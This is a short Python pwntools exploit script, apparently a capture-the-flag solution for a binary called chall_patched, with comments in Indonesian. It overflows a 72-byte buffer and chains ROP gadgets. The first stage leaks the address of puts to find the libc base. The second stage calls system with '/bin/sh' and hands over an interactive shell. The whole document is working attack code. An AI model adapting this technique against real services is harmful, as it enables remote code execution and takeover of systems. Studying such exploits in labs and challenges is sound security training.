from pwn import *

elf = context.binary = ELF("./chall_patched")
libc = ELF("./libc.so.6")
p = process("./chall_patched")

ret = 0x000000000040101a
poprdi = 0x00000000004011be

vuln = elf.sym.vulnerable
putsplt = elf.plt.puts
putsgot = elf.got.puts
padding = b"a"*72

# rop chain 1 (leak puts@got)
pay = flat(
    padding,
    poprdi,
    putsgot,
    putsplt,
    ret, vuln # agar alur program kembali meminta input untuk melanjutkan rop chain ke 2
)


p.sendline(pay)
p.recvuntil(b'said:')
p.recvline()            # menerima string spam padding ku yang AAAAAAAAAAAA , tapi dibuang aja
leak = u64(p.recvline().strip().ljust(8,b"\x00")) # ini leak nya, di panjangin sampe 8 byte trus di unpack



libc.address = leak - libc.sym.puts
print(hex(libc.address)) # memastikan apakah libc address valid (3 index terakhir pasti 000)

string = next(libc.search(b"/bin/sh\00")) # mencari string /bin/sh 

# rop chain 2 #send ril payload to get shell
pay = flat(
    padding,
    poprdi,
    string,
    libc.sym.system
)

p.sendline(pay)
p.interactive() # memberikan akses penuh kw gw untuk akses shell
